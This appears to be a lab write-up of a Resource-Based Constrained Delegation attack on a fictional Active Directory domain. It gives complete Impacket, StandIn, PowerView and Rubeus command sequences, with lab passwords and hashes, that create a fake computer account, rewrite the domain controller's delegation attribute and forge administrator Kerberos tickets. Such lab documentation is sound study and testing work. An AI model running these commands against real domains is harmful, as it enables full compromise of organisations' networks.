Resource Based Constrained Delegation


Resource-Based Constrained Delegation (RBCD)

  1. 1.

    1. Hypothesis & Concept

Hypothesis: If an attacker has write access (e.g., GenericAll, GenericWrite, WriteDACL, WriteOwner) over a target computer object in Active Directory, they can configure that computer to trust a fake computer account controlled by the attacker for delegation.

Concept: Resource-Based Constrained Delegation (RBCD) shifts the delegation authority from the requesting service to the target resource. The target computer defines who is allowed to delegate authentication to it by populating its msDS-AllowedToActOnBehalfOfOtherIdentity attribute.

The Exploit: We use our compromised user's privileges to create a new, attacker-controlled computer account (MachineAccountQuota is usually 10 by default). We then modify the target's msDS-AllowedToActOnBehalfOfOtherIdentity attribute to point to our new fake computer. Finally, we use S4U2Self/S4U2Proxy to forge a ticket as a Domain Admin.

  1. 2.

    2. Vulnerability Identification (Reconnaissance)

Objective: Identify accounts with administrative rights over high-value targets (like Domain Controllers).

Tool: BloodHound Findings: Analysis in BloodHound revealed that our compromised user NARUTO_UZUMAKI07@SHINOBI.LOCAL possesses GenericAll rights over the Domain Controller object DC01.SHINOBI.LOCAL. This gives us full control to modify the DC's AD attributes.

  1. 3.

    3. Scenario 1: Attack from Kali Linux (Impacket)

Step 1: Create a Fake Computer Account

Objective: Create an attacker-controlled machine account to act as the delegating service.

Tool: impacket-addcomputer

Command:

impacket-addcomputer shinobi.local/naruto_uzumaki07:Konoha@123 -computer-name fakepc -computer-pass Password@123 -dc-ip 192.168.56.10

Findings: We successfully abused the default MachineAccountQuota to create the machine account fakepc$ with a known password.

Step 2: Configure RBCD on the Target

Objective: Abuse naruto_uzumaki07's GenericAll privilege to write the SID of fakepc$ into DC01$'s msDS-AllowedToActOnBehalfOfOtherIdentity attribute.

Tool: impacket-rbcd

Command:

impacket-rbcd shinobi.local/naruto_uzumaki07:Konoha@123 -action write -delegate-to 'DC01$' -delegate-from 'fakepc$' -dc-ip 192.168.56.10

Findings: The tool successfully modified the delegation rights. fakepc$ is now authorized to impersonate any user on DC01$ via S4U2Proxy.

Step 3: Verify the Delegation

Objective: Confirm the RBCD configuration was applied to AD. Tool: impacket-findDelegation Command:

impacket-findDelegation shinobi.local/naruto_uzumaki07:Konoha@123 -dc-ip 192.168.56.10

Findings: The output clearly lists fakepc$ possessing Resource-Based Constrained Delegation rights to DC01$.

Step 4: Request Service Ticket & Exploit (S4U)

Objective: Request a Kerberos ticket impersonating a Domain Admin (itachi_anbu01) to the DC's CIFS service.

Tool: impacket-getST

Command:

impacket-getST -spn 'cifs/DC01.shinobi.local' -impersonate 'itachi_anbu01' 'shinobi.local/fakepc$:Password@123'

Findings: A valid .ccache Kerberos ticket was generated and saved locally for itachi_anbu01 targeting cifs_DC01.shinobi.local. By exporting this to the KRB5CCNAME environment variable, we can now use wmiexec.py or smbclient.py to achieve full domain compromise.

  1. 4.

    4. Scenario 2: Attack from Local Windows

Step 1: Create a Fake Computer Account (StandIn)

Objective: Create an attacker-controlled machine account locally from the compromised Windows host to act as the delegating service. Tool: StandIn_v13_Net45.exe Command:

.\StandIn_v13_Net45.exe --computer attackerpc --make

Findings: The executable successfully added a new machine account to Active Directory.

  • Computer Name: attackerpc$

  • Generated Password: eUsunQeLKzpBBbj

Step 2: Configure RBCD on the Target (

PowerView

)

Objective: Abuse naruto_uzumaki07's GenericAll rights to modify the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the Domain Controller. This requires converting the fake computer's SID into a raw byte security descriptor.

Tool: PowerView

Commands:

$attackersid = (Get-DomainComputer attackerpc).objectsid
$sd=New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$attackersid)"
$SDBytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($SDBytes, 0)
Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

Findings: PowerView successfully extracted the DC01$ object and applied the modified byte array. The verbose output confirms the attribute was updated with the new Security Descriptor.

Step 3: Generate Password Hashes for the Fake PC

Objective: Rubeus requires the NTLM/RC4 or AES hash of the attackerpc$ account to request the initial tickets. Tool: Rubeus.exe Command:

.\Rubeus.exe hash /domain:shinobi.local /user:attackerpc$ /password:eUsunQeLKzpBBbj

Findings: Rubeus calculated the hashes, outputting the rc4_hmac hash: 564386EBA1C5776C18DEFD6CCBD34241.

Step 4: Execute S4U Impersonation (Rubeus)

Objective: Use Rubeus to perform the S4U2Self and S4U2Proxy requests using the fake computer's RC4 hash. We will impersonate the administrator account and request SPN equivalence for cifs and host.

Tool: Rubeus.exe

Command:

.\Rubeus.exe s4u /user:attackerpc$ /domain:shinobi.local /rc4:564386EBA1C5776C18DEFD6CCBD34241 /impersonateuser:administrator /msdsspn:http/dc01 /altservice:cifs,host /ptt /nowrap

Findings: Rubeus successfully requested the TGT, performed the S4U2self request for administrator, and completed the S4U2proxy request. The /ptt flag directly injected these tickets into memory. Running klist confirmed that administrator tickets for host/dc01 and cifs/dc01 were successfully cached.

Step 5: Verification / Impact

Objective: Verify administrative access to the Domain Controller utilizing the injected Kerberos ticket.

Command:

ls //dc01/c$

Findings: The directory listing was completely successful, exposing the Domain Controller's native file system (including inetpub, Windows, Users, etc.). Because the command was executed natively via the SMB/CIFS protocol, it validates the SPN equivalence requested in Step 4. Total domain compromise achieved.
